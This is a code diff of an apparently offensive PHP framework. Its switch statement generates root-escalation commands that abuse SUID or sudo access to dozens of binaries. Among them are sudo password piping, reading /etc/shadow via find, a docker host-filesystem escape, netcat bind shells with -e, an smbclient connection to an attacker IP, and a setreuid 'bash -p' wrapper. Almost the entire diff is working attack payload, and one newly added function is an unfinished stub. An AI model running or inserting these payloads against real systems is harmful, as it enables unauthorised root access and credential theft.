@@ -1814,7 +1814,17 @@ L’espace noyau allant de 0xC0000000 à 0xFFFFFFFF ");
 	$this->bin2content_strings("");$this->pause();
 	}
 
-
+	
+	public function elf4root2write($target_ip,$attacker_port,$shell,$sudo,$userpass,$write2what,$write2where){
+	    $this->ssTitre(__FUNCTION__);
+	    $target_ip = trim($target_ip);
+	    $attacker_ip = $this->ip4addr4target($target_ip);
+	    $cmd = trim($cmd);
+	    
+	    
+	    if (!empty($userpass)) $via_sudo = "echo '$userpass' | sudo -S ";
+	    else $via_sudo = "sudo ";
+	}
 	
 
 	public function elf4root2read($sudo,$userpass,$file2read){
@@ -2027,7 +2037,7 @@ L’espace noyau allant de 0xC0000000 à 0xFFFFFFFF ");
 	    $data = "";
 	    $data_sudo = "";
 	    $data_rst = "";
-	    $sha1_hash = sha1($cmd);
+	    $sha1_hash = sha1($cmd.time());
 	    
 	        switch ($this->file_name){
 	            
@@ -2053,7 +2063,7 @@ L’espace noyau allant de 0xC0000000 à 0xFFFFFFFF ");
 	                
 
 	            case "awk": // OK lin.Security
-	                $data = "$this->file_path \"BEGIN {system(\\\"$via_suid -c $cmd\\\")}\"";
+	                $data = "$this->file_path \"BEGIN {system(\\\"$via_suid -c '$cmd'\\\")}\"";
 	                $data_sudo = "$via_sudo $data";	                
 	                break ;
 	                
@@ -2065,37 +2075,37 @@ L’espace noyau allant de 0xC0000000 à 0xFFFFFFFF ");
 	                
 	                
 	            case "busybox":
-	                $data = "$this->file_path telnetd - | $via_suid -c $cmd";
+	                $data = "$this->file_path telnetd - | $via_suid -c '$cmd'";
 	                $data_sudo = "$via_sudo $data";
 	                
 	                break ;
 	                
 	            case "chsh":
-	                $data = "$this->file_path -s $via_suid -c $cmd ";
+	                $data = "$this->file_path -s $via_suid -c '$cmd' ";
 	                $data_sudo = "$via_sudo $data";
 	                
 	                break ;
 	                
 	            case "cpan":
-	                $data = "$this->file_path -e \"! \\\"$via_suid -c $cmd\\\"\" ";
+	                $data = "$this->file_path -e \"! \\\"$via_suid -c '$cmd'\\\"\" ";
 	                $data_sudo = "$via_sudo $data";
 	                
 	                break ;
 	                
 	            case "cpulimit":
-	                $data = "cpulimit -l 100 -f \"$via_suid -c $cmd\" ";
+	                $data = "cpulimit -l 100 -f \"$via_suid -c '$cmd'\" ";
 	                $data_sudo = "$via_sudo $data";
 	                
 	                break ;
 	                
 	            case "crontab":
-	                $data = "$this->file_path -e \"$via_suid -c $cmd\" ";
+	                $data = "$this->file_path -e \"$via_suid -c '$cmd'\" ";
 	                $data_sudo = "$via_sudo $data";
 	                
 	                break ;
 	                
 	            case "csh": // OK lin.Security
-	                $data = "$this->file_path -c \"$via_suid -c $cmd\" ";
+	                $data = "$this->file_path -c \"$via_suid -c '$cmd'\" ";
 	                $data_sudo = "$via_sudo $data";
 	                
 	                break ;
@@ -2111,7 +2121,7 @@ L’espace noyau allant de 0xC0000000 à 0xFFFFFFFF ");
 int main(void){
 setreuid(geteuid(),getuid());
 setregid(getegid(),getgid());
-system("/bin/bash -p -c $cmd");
+system("/bin/bash -p -c '$cmd'");
 return 0;
 }
 EOC;
@@ -2134,7 +2144,7 @@ EOC;
 
 	                $query = "gcc -m32 -o $this->dir_tmp/$sha1_cmd $file_path && chmod 777 $this->dir_tmp/$sha1_cmd ";
 	                $this->requette($query);
-                    $query = "echo \"$via_suid -c $cmd\" > $this->dir_tmp/$sha1_cmd.sh  ";
+                    $query = "echo \"$via_suid -c '$cmd'\" > $this->dir_tmp/$sha1_cmd.sh  ";
                     $query = "echo \"sudo $via_suid -c id\" > $this->dir_tmp/$sha1_cmd.sh  ";
                     $this->requette($query);
 
@@ -2155,7 +2165,7 @@ EOC;
                         
 	                
 	            case "dash": // OK lin.Security
-	                $data = "$this->file_path -c \"$via_suid -c $cmd\" ";
+	                $data = "$this->file_path -c \"$via_suid -c '$cmd'\" ";
 	                $data_sudo = "$via_sudo $data";
 	                
 	                break ;
@@ -2170,22 +2180,22 @@ EOC;
 	                
 	                break ;
 	            case "dmsetup":
-	                $data = "$this->file_path ls --exec \"$via_suid -c $cmd\" ";
+	                $data = "$this->file_path ls --exec \"$via_suid -c '$cmd'\" ";
 	                $data_sudo = "$via_sudo $data";
 	                
 	                break ;
 	            case "dnf":
-	                $data = "  \"$via_suid -c $cmd\" ";
+	                $data = "  \"$via_suid -c '$cmd'\" ";
 	                $data_sudo = "$via_sudo $data";
 	                
 	                break ;
 	            case "docker":
-	                $data = "$this->file_path run -v /:/mnt --rm -it alpine chroot /mnt sh -c \"$via_suid -c $cmd\" ";
+	                $data = "$this->file_path run -v /:/mnt --rm -it alpine chroot /mnt sh -c \"$via_suid -c '$cmd'\" ";
 	                $data_sudo = "$via_sudo $data";
 	                
 	                break ;
 	            case "dpkg":
-	                $data = " \"$via_suid -c $cmd\" ";
+	                $data = " \"$via_suid -c '$cmd'\" ";
 	                $data_sudo = "$via_sudo $data";
 	                
 	                break ;
@@ -2210,23 +2220,23 @@ EOC;
 	                break ;
 	                
 	            case "env": // OK lin.Security
-	                $data = "$this->file_path $cmd ";
+	                $data = "$this->file_path '$cmd' ";
 	                $data_sudo = "$via_sudo $data";	                
 	                break ;
                         
 
 	            case "exec": // 
-	                $data = "$this->file_path $cmd ";
+	                $data = "$this->file_path '$cmd' ";
 	                $data_sudo = "$via_sudo $data";
 	                break ;
 	                
 	                
 	            case "expect": // OK lin.Security
-	                $data = "(sleep 15; echo \"$via_suid -c $cmd\"; ) | socat - EXEC:\"expect -i\",pty,stderr,setsid,sigint,ctty,sane";
-	                $data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2; echo \"$via_suid -c $cmd\";  sleep 30 ) | socat - EXEC:\"sudo expect -i\",pty,stderr,setsid,sigint,ctty,sane";
+	                $data = "(sleep 15; echo \"$via_suid -c '$cmd'\"; ) | socat - EXEC:\"expect -i\",pty,stderr,setsid,sigint,ctty,sane";
+	                $data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2; echo \"$via_suid -c '$cmd'\";  sleep 30 ) | socat - EXEC:\"sudo expect -i\",pty,stderr,setsid,sigint,ctty,sane";
 	                
-	                $data = "echo -e \"$this->file_name -i<<# >/dev/null 2>&1\n$via_suid -c $cmd\n#\" | sh  ";
-	                $data_sudo = "echo -e \"sudo $this->file_name -i<<# >/dev/null 2>&1\n$userpass\n$via_suid -c $cmd\n#\" | sh  ";
+	                $data = "echo -e \"$this->file_name -i<<# >/dev/null 2>&1\n$via_suid -c '$cmd'\n#\" | sh  ";
+	                $data_sudo = "echo -e \"sudo $this->file_name -i<<# >/dev/null 2>&1\n$userpass\n$via_suid -c '$cmd'\n#\" | sh  ";
 	                
 	                break;
 	                
@@ -2238,17 +2248,17 @@ EOC;
 	                
                     
 	            case "find": // OK lin.Security
-	                $data = "$this->file_path /etc/shadow -type f -exec $cmd \; ";
+	                $data = "$this->file_path /etc/shadow -type f -exec '$cmd' \; ";
 	                $data_sudo = "$via_sudo $data";	                
 	                break ;
 	                
 	                
 	            case "finger":
-	                $data = " \"$via_suid -c $cmd\" ";
+	                $data = " \"$via_suid -c '$cmd'\" ";
 	                break;
 	                
 	            case "flock":
-	                $data = "$this->file_path -u / $cmd ";
+	                $data = "$this->file_path -u / '$cmd' ";
 	                $data_sudo = "$via_sudo $data";
 	                
 	                break ;
@@ -2257,23 +2267,22 @@ EOC;
 	            case "ftp": // OK lin.Security 
 	                $data = "(sleep 15; echo \"! $cmd\"; sleep 30) | socat - EXEC:\"ftp\",pty,stderr,setsid,sigint,ctty,sane";
 	                $data_sudo = "(sleep 15; echo \"$userpass\" ; sleep 2;echo \"! $cmd\"; sleep 30) | socat - EXEC:\"sudo ftp\",pty,stderr,setsid,sigint,ctty,sane";	                
-	                $data_sudo = "echo \"! $cmd\"| sudo ftp";
-	                
-	                $data = "echo -e \"$this->file_name <<# >/dev/null 2>&1\n! $cmd\n#\" | sh  ";
-	                $data_sudo = "echo -e \"sudo $this->file_name <<# >/dev/null 2>&1\n$userpass\n! $cmd\n#\" | sh  ";
-	                
+	               	                
+	                // OK infinity stones
+	                $data = "(echo '! %ID%';sleep 2;) | $this->file_path ";
+	                $data_sudo = "(echo '! %ID%';sleep 2;) | $via_sudo $this->file_path ";	                
 	                break;
 	                
 	                
 	                
 	            case "gdb":
-	                $data = "$this->file_path --batch -q -ex \"! $via_suid -c $cmd\" -ex \"quit\" ";
+	                $data = "$this->file_path --batch -q -ex \"! $via_suid -c '$cmd'\" -ex \"quit\" ";
 	                $data_sudo = "$via_sudo $data";
 	                
 	                break ;
 	                
 	            case "gimp":
-	                $data = "$this->file_path -idf --batch-interpreter=python-fu-eval -b \"import os; os.system(\\\"$via_suid -c $cmd\\\")\"  ";
+	                $data = "$this->file_path -idf --batch-interpreter=python-fu-eval -b \"import os; os.system(\\\"$via_suid -c '$cmd'\\\")\"  ";
 	                $data_sudo = "$via_sudo $data";
 	                break ;
 	                
@@ -2291,7 +2300,7 @@ EOC;
 	                
 
 	            case "ionice":
-	                $data = "$this->file_path \"$via_suid -c $cmd\" ";
+	                $data = "$this->file_path \"$via_suid -c '$cmd'\" ";
 	                $data_sudo = "$via_sudo $data";
 	                break ;
 
@@ -2306,7 +2315,7 @@ exec \"/bin/bash\" ";
 	                break;
 	                
 	            case "journalctl":
-	                $data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2 ; echo \"! $via_suid -c $cmd\"; sleep 30) | socat - EXEC:\"sudo journalctl\",pty,stderr,setsid,sigint,ctty,sane";
+	                $data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2 ; echo \"! $via_suid -c '$cmd'\"; sleep 30) | socat - EXEC:\"sudo journalctl\",pty,stderr,setsid,sigint,ctty,sane";
 	                
 	                $data = "echo -e \"$this->file_name <<# >/dev/null 2>&1\n!$via_suid\n$cmd\n#\" | sh ";
 	                $data_sudo = "echo -e \"sudo $this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\"  | sh ";
@@ -2315,30 +2324,30 @@ exec \"/bin/bash\" ";
 	                
 
 	            case "jrunscript":
-	                $data = "$this->file_path -e \"exec(\\\"$via_suid -c $cmd\\\")\"  ";
+	                $data = "$this->file_path -e \"exec(\\\"$via_suid -c '$cmd'\\\")\"  ";
 	                $data_sudo = "$via_sudo $data";
 	                
 	                break ;
 	            case "ksh":
-	                $data = "$this->file_path -c \"$via_suid -c $cmd\" ";
+	                $data = "$this->file_path -c \"$via_suid -c '$cmd'\" ";
 	                $data_sudo = "$via_sudo $data";
 	                
 	                break ;
 	                
 	                
 	            case "ldconfig":
-	                $data = "/lib/ld.so \"$via_suid -c $cmd\" ";
+	                $data = "/lib/ld.so \"$via_suid -c '$cmd'\" ";
 	                $data_sudo = "$via_sudo $data";	                
 	                break ;
 	                
 	            case "ld.so":
 	                // https://gtfobins.github.io/gtfobins/ldconfig
-	                $data_sudo = " \"$via_suid -c $cmd\" ";
+	                $data_sudo = " \"$via_suid -c '$cmd'\" ";
 	                break;
 	                
 	            case "less": // OK lin.Security
 	                $data = "(sleep 15; echo \"! $cmd\"; ) | socat - EXEC:\"$this->file_path /etc/passwd\",pty,stderr,setsid,sigint,ctty,sane";	                
-	                $data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2 ; echo \"!$via_suid -c $cmd\"; sleep 30) | socat - EXEC:\"sudo $this->file_path /etc/shadow\",pty,stderr,setsid,sigint,ctty,sane";
+	                $data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2 ; echo \"!$via_suid -c '$cmd'\"; sleep 30) | socat - EXEC:\"sudo $this->file_path /etc/shadow\",pty,stderr,setsid,sigint,ctty,sane";
 	                
 	                $data = "echo -e \"$this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
 	                $data_sudo = "echo -e \"sudo $this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
@@ -2347,22 +2356,22 @@ exec \"/bin/bash\" ";
 	                
 	                
 	            case "logsave":
-	                $data = "$this->file_path /dev/null \"$via_suid -c $cmd\" ";
+	                $data = "$this->file_path /dev/null \"$via_suid -c '$cmd'\" ";
 	                $data_sudo = "$via_sudo $data";
 	                
 	                break ;
 	            case "ltrace":
-	                $data = "$this->file_path -b -L \"$via_suid -c $cmd\" ";
+	                $data = "$this->file_path -b -L \"$via_suid -c '$cmd'\" ";
 	                $data_sudo = "$via_sudo $data";
 	                
 	                break ;
 	            case "lua":
-	                $data = "$this->file_path -e \"os.execute(\\\"$via_suid -c $cmd\\\")\"  ";
+	                $data = "$this->file_path -e \"os.execute(\\\"$via_suid -c '$cmd'\\\")\"  ";
 	                $data_sudo = "$via_sudo $data";
 	                
 	                break ;
 	            case "mail":
-	                $data = "mail --exec=\\\"! $via_suid -c $cmd\\\" ";
+	                $data = "mail --exec=\\\"! $via_suid -c '$cmd'\\\" ";
 	                $data_sudo = "$via_sudo $data";
 	                
 	                break ;
@@ -2389,7 +2398,7 @@ exec \"/bin/bash\" ";
 	                
 	            case "more": // OK lin.Security
 	                $data = "(sleep 15; echo \"! $cmd\"; sleep 30) | socat - EXEC:\"$this->file_path /etc/profile\",pty,stderr,setsid,sigint,ctty,sane";
-	                $data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2 ; echo \"!$via_suid -c $cmd\"; sleep 30) | socat - EXEC:\"sudo $this->file_path /etc/profile\",pty,stderr,setsid,sigint,ctty,sane";
+	                $data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2 ; echo \"!$via_suid -c '$cmd'\"; sleep 30) | socat - EXEC:\"sudo $this->file_path /etc/profile\",pty,stderr,setsid,sigint,ctty,sane";
 	                
 	                $data = "echo -e \"$this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
 	                $data_sudo = "echo -e \"sudo $this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
@@ -2397,30 +2406,30 @@ exec \"/bin/bash\" ";
 	                break;
 	                
 	            case "mount":
-	                $data = "$this->file_path -o bind $via_suid /bin/mount && /bin/mount $cmd ";
+	                $data = "$this->file_path -o bind $via_suid /bin/mount && /bin/mount '$cmd' ";
 	                $data_sudo = "$via_sudo $data";
 	                
 	                break ;
 
 	            case "mv":
-	                $data_sudo = " \"$via_suid -c $cmd\" ";
+	                $data_sudo = " \"$via_suid -c '$cmd'\" ";
 	                break;
 	                
 	            case "mysql":
-	                $data = "$this->file_path -e \"\! $via_suid -c $cmd\" ";
+	                $data = "$this->file_path -e \"\! $via_suid -c '$cmd'\" ";
 	                $data_sudo = "$via_sudo $data";
 	                
 	                break ;
 	            case "nano":
 	                $data = "$this->file_path
 ^R^X
-reset; sh \"$via_suid -c $cmd\" 1>&0 2>&0  ";
+reset; sh \"$via_suid -c '$cmd'\" 1>&0 2>&0  ";
 	                $data_sudo = "$via_sudo $data";
 	                
 	                break ;
 	            case "nc":
 	            case "nc.traditional":
-	                $data = "$this->file_path -l -p 9999 -e \"$via_suid -c $cmd\" ";
+	                $data = "$this->file_path -l -p 9999 -e \"$via_suid -c '$cmd'\" ";
 	                $data_sudo = "$via_sudo $data";	                
 	                break ;
 	                
@@ -2429,26 +2438,26 @@ reset; sh \"$via_suid -c $cmd\" 1>&0 2>&0  ";
 	                 ncat --exec cmd.exe --allow [alice] -vnl 443 --ssl
 	                 ncat -v [bob] 443 --ssl
 	                 */
-	                $data = "$this->file_path -l -p 9999 -e \"$via_suid -c $cmd\" ";
+	                $data = "$this->file_path -l -p 9999 -e \"$via_suid -c '$cmd'\" ";
 	                $data_sudo = "$via_sudo $data";
 	                
 	                break ;
 	                
 	            case "nice":
-	                $data = "$this->file_path \"$via_suid -c $cmd\" ";
+	                $data = "$this->file_path \"$via_suid -c '$cmd'\" ";
 	                $data_sudo = "$via_sudo $data";
 	                
 	                break ;
 	                
 
 	            case "nmap":
-	                $data = "TF=\$(mktemp) && echo \"os.execute(\\\"$via_suid -c $cmd\\\")\" > \$TF && $sudo nmap --script=\$TF ";
+	                $data = "TF=\$(mktemp) && echo \"os.execute(\\\"$via_suid -c '$cmd'\\\")\" > \$TF && $sudo nmap --script=\$TF ";
 	                echo "$data\n";
-	                $data = "$this->file_path --script <(echo \"os.execute(\\\"$via_suid -c $cmd\\\")\")";
+	                $data = "$this->file_path --script <(echo \"os.execute(\\\"$via_suid -c '$cmd'\\\")\")";
 	                echo "$data\n";
-	                $data = "echo \"os.execute(\\\"$via_suid -c $cmd\\\")\" > /tmp/script_wan.nse && $this->file_path --script=/tmp/script_wan.nse ";
+	                $data = "echo \"os.execute(\\\"$via_suid -c '$cmd'\\\")\" > /tmp/script_wan.nse && $this->file_path --script=/tmp/script_wan.nse ";
 	                echo "$data\n";
-	                $data_sudo = "echo \"os.execute(\\\"$via_suid -c $cmd\\\")\" > /tmp/script_wan.nse && sudo $this->file_path --script=/tmp/script_wan.nse ";
+	                $data_sudo = "echo \"os.execute(\\\"$via_suid -c '$cmd'\\\")\" > /tmp/script_wan.nse && sudo $this->file_path --script=/tmp/script_wan.nse ";
 	                
 	                break ;
 	            case "node":
@@ -2458,21 +2467,21 @@ reset; sh \"$via_suid -c $cmd\" 1>&0 2>&0  ";
 	                break ;
 
 	            case "openssl":
-	                $data = "  \"$via_suid -c $cmd\" ";
+	                $data = "  \"$via_suid -c '$cmd'\" ";
 	                $data_sudo = "$via_sudo $data";
 	                
 	                break ;
 	                
 	                
 	            case "perl":  // OK lin.Security
-	                $data = "$this->file_path -e \"exec \\\"$via_suid -c $cmd\\\";\"  ";
+	                $data = "$this->file_path -e \"exec \\\"$via_suid -c '$cmd'\\\";\"  ";
 	                $data_sudo = "$via_sudo $data";
 	                
 	                break ;
                     
 	                
 	            case "php":
-	                $data = "$this->file_path -r \"system(\\\"$via_suid -c $cmd\\\");\"  ";
+	                $data = "$this->file_path -r \"system(\\\"$via_suid -c '$cmd'\\\");\"  ";
 	                $data_sudo = "$via_sudo $data";
 	                
 	                break ;
@@ -2488,8 +2497,8 @@ sh X sh X $cmd ";
 	            case "pico": // No Lin.Security 
 	                //$data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2 ; echo -e '\\x18'; sleep 2;echo -e '\\x24'; sleep 2;echo \"reset; sh -c $cmd 1>&0 2>&0\"; sleep 2; echo -e '\\x24'; sleep 2; echo -e 'N\\n';) | socat - EXEC:\"sudo pico /etc/profile\",pty,stderr,setsid,sigint,ctty,sane";
 	                
-	                $data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2; echo \"^R^X\"; sleep 2; echo \"reset; $via_suid $cmd \"; sleep 10;) | socat - EXEC:\"sudo $this->file_path /etc/profile\",pty,stderr,setsid,sigint,ctty,sane";
-	                //$data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2; echo \"^R\"; sleep 2; echo \"^X\"; sleep 2; echo \"reset; $via_suid $cmd 1>&0 2>&0\"; sleep 10;) | socat - EXEC:\"sudo $this->file_path /etc/profile\",pty,stderr,setsid,sigint,ctty,sane";
+	                $data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2; echo \"^R^X\"; sleep 2; echo \"reset; $via_suid '$cmd' \"; sleep 10;) | socat - EXEC:\"sudo $this->file_path /etc/profile\",pty,stderr,setsid,sigint,ctty,sane";
+	                //$data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2; echo \"^R\"; sleep 2; echo \"^X\"; sleep 2; echo \"reset; $via_suid '$cmd' 1>&0 2>&0\"; sleep 10;) | socat - EXEC:\"sudo $this->file_path /etc/profile\",pty,stderr,setsid,sigint,ctty,sane";
 	                
 	                $data = "echo -e \"$this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
 	                $data_sudo = "echo -e \"sudo $this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
@@ -2505,34 +2514,34 @@ sh X sh X $cmd ";
 	                break;
 	                
 	            case "puppet":
-	                $data = "$this->file_path apply -e \"exec {\\\"$via_suid  -c \"exec sh -i $cmd <$(tty) >$(tty) 2>$(tty)\\\": }\"  ";
+	                $data = "$this->file_path apply -e \"exec {\\\"$via_suid  -c \"exec sh -i '$cmd' <$(tty) >$(tty) 2>$(tty)\\\": }\"  ";
 	                $data_sudo = "$via_sudo $data";
 	                
 	                break ;
 
 	                
 	            case "python3":
-	                $data = "$this->file_path -c ':py3 import os; os.execl(\"/bin/bash\", \"bash\", \"-c\", \"reset; exec $via_suid -c $cmd\")'";
+	                $data = "$this->file_path -c ':py3 import os; os.execl(\"/bin/bash\", \"bash\", \"-c\", \"reset; exec $via_suid -c '$cmd'\")'";
 	                $data_sudo = "$via_sudo $data";
 	                break ;
 	                
 	            case "python":
-	                $data = "$this->file_path -c \"import os; os.system(\\\"$via_suid -c $cmd\\\")\"  ";
+	                $data = "$this->file_path -c \"import os; os.system(\\\"$via_suid -c '$cmd'\\\")\"  ";
 	                $data_sudo = "$via_sudo $data";
-	                //$data = "$this->file_path -c ':py3 import os; os.execl(\"/bin/bash\", \"bash\", \"-c\", \"reset; exec $via_suid -c $cmd\")'";
+	                //$data = "$this->file_path -c ':py3 import os; os.execl(\"/bin/bash\", \"bash\", \"-c\", \"reset; exec $via_suid -c '$cmd'\")'";
 	                //$data_sudo = "$via_sudo $data";
 	                break ;
 	                
 	            case "red":
-	                $data_sudo = " \"$via_suid -c $cmd\" ";
+	                $data_sudo = " \"$via_suid -c '$cmd'\" ";
 	                break;
 	                
 	            case "rlogin":
-	                $data_sudo = " \"$via_suid -c $cmd\" ";
+	                $data_sudo = " \"$via_suid -c '$cmd'\" ";
 	                break;
 	                
 	            case "rlwrap":
-	                $data = "$this->file_path \"$via_suid -c $cmd\" ";
+	                $data = "$this->file_path \"$via_suid -c '$cmd'\" ";
 	                $data_sudo = "$via_sudo $data";
 	                
 	                break ;
@@ -2549,12 +2558,12 @@ sh X sh X $cmd ";
 	                break ;
 	                
 	            case "rsync":
-	                $data = "$this->file_path -e \"sh -c \\\"$via_suid -c $cmd 0<&2 1>&2\\\"\" 127.0.0.1:/dev/null";
+	                $data = "$this->file_path -e \"sh -c \\\"$via_suid -c '$cmd' 0<&2 1>&2\\\"\" 127.0.0.1:/dev/null";
 	                $data_sudo = "$via_sudo $data";
 	                
 	                break ;
 	            case "ruby":
-	                $data = "$this->file_path -e \"exec \\\"$via_suid -c $cmd\\\"\"  ";
+	                $data = "$this->file_path -e \"exec \\\"$via_suid -c '$cmd'\\\"\"  ";
 	                $data_sudo = "$via_sudo $data";
 	                
 	                break ;
@@ -2568,7 +2577,7 @@ sh X sh X $cmd ";
 	                
 	                
 	            case "rvim": // OK lin.Security 
-	                $data = "$this->file_path -c ':py3 import os; os.execl(\"/bin/bash\", \"bash\", \"-c\", \"reset; exec $via_suid -c $cmd\")'";
+	                $data = "$this->file_path -c ':py3 import os; os.execl(\"/bin/bash\", \"bash\", \"-c\", \"reset; exec $via_suid -c '$cmd'\")'";
 	                $data_sudo = "$via_sudo $data";
 	                break ;
 	                
@@ -2576,9 +2585,9 @@ sh X sh X $cmd ";
 
                     
 	            case "scp": // OK lin.Security
-	                //$data_sudo = "TF=\$(mktemp) && echo \"$cmd 0<&2 1>&2\" > \$TF && chmod +x \$TF && $via_sudo $this->file_path -S \$TF x y: 0<&2 1>&2 ";
-	                $data_sudo = "echo \"$via_suid -c $cmd > /tmp/rst.txt \" > $this->vm_tmp_lin/$sha1_hash.sh && chmod +x $this->vm_tmp_lin/$sha1_hash.sh ; $via_sudo $this->file_path -S $this->vm_tmp_lin/$sha1_hash.sh x y: ; cat /tmp/rst.txt "; // OK
-	                //$data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2 ; echo \"echo \\\"/bin/bash -p -c $cmd\\\" > $this->vm_tmp_lin/tst.sh && chmod 6777 $this->vm_tmp_lin/tst.sh\"; sleep 2; $this->vm_tmp_lin/tst.sh; sleep 30) | socat - EXEC:\"sudo $this->file_path -S $this->vm_tmp_lin/tst.sh x y\:\",pty,stderr,setsid,sigint,ctty,sane";
+	                //$data_sudo = "TF=\$(mktemp) && echo \"'$cmd' 0<&2 1>&2\" > \$TF && chmod +x \$TF && $via_sudo $this->file_path -S \$TF x y: 0<&2 1>&2 ";
+	                $data_sudo = "echo \"$via_suid -c '$cmd' > /tmp/rst.txt \" > $this->vm_tmp_lin/$sha1_hash.sh && chmod +x $this->vm_tmp_lin/$sha1_hash.sh ; $via_sudo $this->file_path -S $this->vm_tmp_lin/$sha1_hash.sh x y: ; cat /tmp/rst.txt "; // OK
+	                //$data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2 ; echo \"echo \\\"/bin/bash -p -c '$cmd'\\\" > $this->vm_tmp_lin/tst.sh && chmod 6777 $this->vm_tmp_lin/tst.sh\"; sleep 2; $this->vm_tmp_lin/tst.sh; sleep 30) | socat - EXEC:\"sudo $this->file_path -S $this->vm_tmp_lin/tst.sh x y\:\",pty,stderr,setsid,sigint,ctty,sane";
 	                
 	                $data = "echo -e \"$this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
 	                $data_sudo = "echo -e \"sudo $this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
@@ -2588,33 +2597,33 @@ sh X sh X $cmd ";
 	                
 	                
 	            case "screen":
-	                $data = "$this->file_path \"$via_suid -c $cmd\" ";
+	                $data = "$this->file_path \"$via_suid -c '$cmd'\" ";
 	                $data_sudo = "$via_sudo $data";	                
 	                break ;
 	                
 	                
 	            case "script": // OK lin.Security
-	                $data = "$this->file_path -q /dev/null -c \"$via_suid -c $cmd\" ";
+	                $data = "$this->file_path -q /dev/null -c \"$via_suid -c '$cmd'\" ";
 	                $data_sudo = "$via_sudo $data";	                
 	                break ;
 	                
 	            case "sed":
-	                $data = "$this->file_path -n \"1e exec $via_suid -c $cmd 1>&0\" /etc/hosts ";
+	                $data = "$this->file_path -n \"1e exec $via_suid -c '$cmd' 1>&0\" /etc/hosts ";
 	                $data_sudo = "$via_sudo $data";	                
 	                break ;
 	                
 	            case "service":
-	                $data = "$this->file_path \"$via_suid -c $cmd\" ";
+	                $data = "$this->file_path \"$via_suid -c '$cmd'\" ";
 	                $data_sudo = "$via_sudo $data";
 	                
 	                break ;
 	            case "setarch":
-	                $data = "setarch \$(arch) \"$via_suid -c $cmd\" ";
+	                $data = "setarch \$(arch) \"$via_suid -c '$cmd'\" ";
 	                $data_sudo = "$via_sudo $data";
 	                
 	                break ;
 	            case "sftp":
-	                $data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2 ; echo \"! $via_suid -c $cmd\"; sleep 30) | socat - EXEC:\"$this->file_path\",pty,stderr,setsid,sigint,ctty,sane";
+	                $data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2 ; echo \"! $via_suid -c '$cmd'\"; sleep 30) | socat - EXEC:\"$this->file_path\",pty,stderr,setsid,sigint,ctty,sane";
 	                
 	                $data = "echo -e \"$this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
 	                $data_sudo = "echo -e \"sudo $this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
@@ -2623,16 +2632,16 @@ sh X sh X $cmd ";
 	                
 	                
 	            case "sh": // OK lin.Security
-	                $data = "$this->file_path -c \"$via_suid -c $cmd\" ";
+	                $data = "$this->file_path -c \"$via_suid -c '$cmd'\" ";
 	                $data_sudo = "$via_sudo $data";	                
 	                break ;
 	                
 
 	            case "smbclient":
 	                $attacker_ip = $this->ip4addr4target($this->ip);
-	                $data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2 ; echo \"! $via_suid -c $cmd\";; sleep 30 ) | socat - EXEC:\"$this->file_path \\\"\\$attacker_ip\share\\\"\",pty,stderr,setsid,sigint,ctty,sane";
+	                $data_sudo = "(sleep 15; echo \"$userpass\" ;sleep 2 ; echo \"! $via_suid -c '$cmd'\";; sleep 30 ) | socat - EXEC:\"$this->file_path \\\"\\$attacker_ip\share\\\"\",pty,stderr,setsid,sigint,ctty,sane";
 	                $note = "$this->file_path '\\$attacker_ip\share'
-!$via_suid  -c  $cmd ";
+!$via_suid  -c  '$cmd' ";
 	                $this->note($note);
 	                
 	                $data = "echo -e \"$this->file_name <<# >/dev/null 2>&1\n$userpass\n!$via_suid\n$cmd\n#\" | sh  ";
@@ -2665,18 +2674,18 @@ sh X sh X $cmd ";
 	                $cmd = trim($cmd);
 	                // ssh user@host bash -c "echo mypass | sudo -S mycommand"
 	                // ssh -o ProxyCommand=';sh 0<&2 1>&2' x
-	                // ssh localhost $cmd --noprofile --norc
-	                $data = "$this->file_path -o ProxyCommand=\";$via_suid -c $cmd 0<&2 1>&2\" x 2>&1 | grep uid ";
+	                // ssh localhost '$cmd' --noprofile --norc
+	                $data = "$this->file_path -o ProxyCommand=\";$via_suid -c '$cmd' 0<&2 1>&2\" x 2>&1 | grep uid ";
 	                $data_sudo = "$via_sudo $data";	                
 	                break ;
 	                
 	            case "start-stop-daemon":
-	                $data = "$this->file_path -n \$RANDOM -S -x \"$via_suid -c $cmd\" ";
+	                $data = "$this->file_path -n \$RANDOM -S -x \"$via_suid -c '$cmd'\" ";
 	                $data_sudo = "$via_sudo $data";	                
 	                break ;
 	                
 	            case "stdbuf":
-	                $data = "$this->file_path -i0 \"$via_suid -c $cmd\" ";
+	                $data = "$this->file_path -i0 \"$via_suid -c '$cmd'\" ";
 	                $data_sudo = "$via_sudo $data";	                
 	                break ;
 	                
@@ -2703,8 +2712,8 @@ sh X sh X $cmd ";
